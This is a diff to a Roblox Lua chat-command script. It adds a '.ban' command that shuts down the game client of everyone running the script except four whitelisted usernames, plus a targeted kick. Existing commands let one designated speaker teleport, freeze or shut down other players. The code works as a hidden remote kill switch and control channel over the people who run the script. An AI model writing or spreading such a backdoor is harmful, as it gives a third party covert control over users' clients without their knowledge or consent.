@@ -273,7 +273,17 @@ end)
                                 end
                             end
                         end
-
+                        
+                        if msg.Message == '.ban' then
+                            if msg.FromSpeaker == Player2.Name then
+                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
+                                else
+                                    wait(2)
+                                    game:Shutdown()
+                                end
+                            end
+                        end
+                        
                         if msg.Message == '.bring '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player2.Name then
                                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Player.Character.HumanoidRootPart.Position)
@@ -427,8 +437,6 @@ end)
                         if msg.Message == '.shutdown '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player2.Name then
                                 wait(.9)
-                                game.Players.LocalPlayer:Kick("You Has Been Banned By Adminstration | To Appeal Contact Owner")
-                                wait(2)
                                 game:Shutdown()
                             end
                         end  
@@ -436,11 +444,15 @@ end)
                         if msg.Message == '.shutdown all' then
                             if msg.FromSpeaker == Player2.Name then
                                wait(.9)
-                                game.Players.LocalPlayer:Kick("You Has Been Banned By Adminstration | To Appeal Contact Owner")
-                                wait(2)
                                 game:Shutdown()
                             end
                         end
+                        
+                        if msg.Message == '.ban '..game:GetService("Players").LocalPlayer.Name then
+                            if msg.FromSpeaker == Player2.Name then
+                                game.Players.LocalPlayer:Kick("You Have Been Banned By Adminstration | To Appeal Contact Owner")
+                            end
+                        end  
         
                         if msg.Message == '.freeze '..game:GetService("Players").LocalPlayer.Name then
                             if msg.FromSpeaker == Player2.Name then
